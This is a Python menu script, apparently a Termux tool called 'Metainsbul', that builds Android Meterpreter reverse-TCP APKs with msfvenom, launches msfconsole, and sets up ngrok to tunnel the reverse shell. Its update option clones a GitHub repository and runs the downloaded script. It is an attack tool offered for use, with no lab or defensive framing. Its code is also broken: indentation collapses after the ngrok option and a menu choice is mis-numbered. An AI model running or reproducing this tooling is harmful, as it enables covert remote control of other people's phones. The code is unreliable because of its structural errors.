import os

def build_payload():
    lhost = input("LHOST - ")
    lport = input("LPORT - ")
    apk_name = input("Payload Name - ")
    print("THE PAYLOAD IS AUTOMATICALLY MOVED TO YOUR Sdcard")
    print("JUST OPEN FILE MANAGER AND VISIT APKS OR JUST SCROLL DOWN")
    print("IN FOLDERS SECTION")

    msfvenom_command = f"msfvenom -p android/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -o {apk_name}.apk"

    print(msfvenom_command)

    os.system(msfvenom_command)

    os.system(f"mv {apk_name}.apk /storage/emulated/0/")

def update():
    os.system("git clone https://github.com/KiNGEX1/Metainsbul.git")
    os.chdir("Metainsbul")
    os.system("chmod +x Meta.py")
    os.system("python Meta.py")

def install_metasploit():
    os.system("python requirements.py")

def launch_metasploit():
    os.system("msfconsole")

while True:
    print("███╗░░░███╗███████╗████████╗░█████╗░██╗███╗░░██╗░██████╗██████╗░██╗░░░██╗██╗░░░░░")
    print("████╗░████║██╔════╝╚══██╔══╝██╔══██╗██║████╗░██║██╔════╝██╔══██╗██║░░░██║██║░░░░░")
    print("██╔████╔██║█████╗░░░░░██║░░░███████║██║██╔██╗██║╚█████╗░██████╦╝██║░░░██║██║░░░░░")
    print("██║╚██╔╝██║██╔══╝░░░░░██║░░░██╔══██║██║██║╚████║░╚═══██╗██╔══██╗██║░░░██║██║░░░░░")
    print("██║░╚═╝░██║███████╗░░░██║░░░██║░░██║██║██║░╚███║██████╔╝██████╦╝╚██████╔╝███████╗")
    print("╚═╝░░░░░╚═╝╚══════╝░░░╚═╝░░░╚═╝░░╚═╝╚═╝╚═╝░░╚══╝╚═════╝░╚═════╝░░╚═════╝░╚══════╝")
    print(" By KiNGEX | https://GitHub.com/KiNGEX1")
    print("__________________________________________")
    
    print("Options:")
    print("1. Build Payload")
    print("2. Install Metasploit")
    print("3. Launch Metasploit")
    print("4. Update Metainsbul (Recommended)") 
    print("5. Ngrok Install & Start")
    print("6. Exit")

    choice = input("Enter your choice: ").strip()

    if choice == '1':
        build_payload() 
    elif choice == '2':
        install_metasploit()
    elif choice == '3':
        launch_metasploit()
    elif choice == '4':
        update()
    elif choice == '6':
        break    
    elif choice == '5':
        print("What's the architecture of your device?")
print("1. Arm-64")
print("2. Arm-32 bit")
print("3. Already Installed (start)")
architecture_choice = input("Enter your choice: ").strip()

if architecture_choice == '1':
            os.system("pkg install wget -y")
            os.system("wget https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-arm64.tgz")
            os.system("tar -xvzf ngrok-v3-stable-linux-arm64.tgz")
            os.system("rm -rf ngrok-v3-stable-linux-arm64.tgz")
            os.system("chmod +x ngrok")
            ngrok_token = input("Enter your ngrok authentication token: ").strip()
            os.system(f"./ngrok authtoken {ngrok_token}")
            os.system("./ngrok config upgrade")
            print(" 1. Start Ngrok")
            print(" 2. Reverse tcp")
            print("__________________________________________________")
            port = input(" Port - ")
            choice = input("Enter your choice").strip()
if choice == '1':
                os.system(f"./ngrok http {port}")
if choice == '2': 
                os.system(f"./ngrok tcp {port}")
elif architecture_choice == '2':
            os.system("pkg install wget -y")
            os.system("wget https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-386.tgz")
            os.system("tar -xvzf ngrok-v3-stable-linux-386.tgz")
            os.system("rm -rf ngrok-v3-stable-linux-386.tgz")
            os.system("chmod +x ngrok")
            ngrok_token = input("Enter your ngrok authentication token: ").strip()
            os.system(f"./ngrok authtoken {ngrok_token}")
            os.system("./ngrok config upgrade")
            print(" 1. Start Ngrok")
            print(" 2. Reverse tcp")
            print("__________________________________________________")
            port = input(" Port - ")
            choice = input("Enter your choice").strip()
if choice == '1':
                os.system(f"./ngrok http {port}")
if choice == '2': 
                os.system(f"./ngrok tcp {port}")
elif architecture_choice == '0':
    print(" 0. Already Installed (Start) ")
    print(" 1. Start Ngrok")
    print(" 2. Reverse tcp")
    print("__________________________________________________")
    port = input(" Port - ")
    choice = input("Enter your choice: ").strip()
    
if choice == '1':
        os.system(f"./ngrok http {port}")
elif choice == '2': 
        os.system(f"./ngrok tcp {port}")

